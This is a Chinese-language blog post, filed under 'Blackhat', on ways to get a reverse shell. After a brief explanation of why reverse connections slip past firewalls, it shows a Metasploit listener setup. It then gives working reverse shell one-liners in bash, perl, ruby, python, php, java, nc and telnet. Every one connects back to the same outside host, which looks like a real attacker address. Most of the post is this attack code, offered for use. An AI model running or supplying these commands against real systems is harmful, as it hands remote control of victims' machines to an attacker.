---
title: 触发反向 shell 的多种方式获取控制权
name: reversh-shell-way
date: 2019-06-05
tags: [shell,reverse]
categories: [Blackhat]
---

* 目录
{:toc}

![metasploit](//via.placeholder.com/748x370?text=""){: data-src="//vinnycc.oss-cn-shanghai.aliyuncs.com/20190605/1512862_1adf.png"}

## 原理

正向连接获取shell的方式早已不是主流，很容易被防火墙或者杀毒软件监控到，除非是正常的授权操作方式。反向连接原理是攻击者启动监听服务，等待被攻击者主动连接从而获取shell，连接通常是建立 **/bin/bash** 或者 **cmd** 的通道。

## 启动监听

使用 metasploit 常规监听方式

```shell
msf > use exploit/multi/handler
msf exploit(handler) > set payload generic/shell_reverse_tcp
msf exploit(handler) > ...... # 设置监听参数
msf exploit(handler) > exploit -j
```

## 反向连接

```shell
# bash
$ bash -i > /dev/tcp/m1d8457118.iok.la/12832 0<&1 2>&1

# perl
$ perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"m1d8457118.iok.la:12832");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'

# ruby
$ ruby -rsocket -e 'exit if fork;c=TCPSocket.new("m1d8457118.iok.la","12832");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'

# python
$ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("m1d8457118.iok.la",12832));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# php
$ php -r '$sock=fsockopen("m1d8457118.iok.la",12832);exec("/bin/sh -i <&3 >&3 2>&3");'

# java
r = Runtime.getRuntime();
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/m1d8457118.iok.la/12832;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]);
p.waitFor();

# nc
$ nc -e /bin/sh m1d8457118.iok.la 12832
$ /bin/sh | nc m1d8457118.iok.la 12832 # -e 选项被禁用的情况

# telnet
$ mknod backpipe p && telnet m1d8457118.iok.la 12832 0<backpipe | /bin/bash 1>backpipe
```